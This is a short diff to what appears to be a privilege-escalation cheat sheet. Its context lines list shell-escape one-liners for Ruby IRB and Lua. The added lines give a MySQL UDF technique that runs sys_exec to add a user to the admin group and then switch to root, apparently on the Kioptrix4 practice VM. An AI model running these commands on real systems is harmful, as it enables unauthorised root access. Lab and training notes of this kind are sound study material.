@@ -66,6 +66,13 @@ irb(main:001:0> exec "/bin/sh"
 lua: `os.execute('/bin/sh')`
 -----
 `exec "/bin/sh"`     // from IRB
+-----
+select sys_exec('usermod -a -G admin john'); // from mysql command prompt. Then use sudo su
+
+First things first, for the MySQL UDF to work - MySQL has to be running with root privileges, so let’s check.
+john@Kioptrix4:/var/www$ ls -la /usr/lib/lib_mysqludf_sys.so 
+-rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so
+-----
 
  
  *SHELLS:*
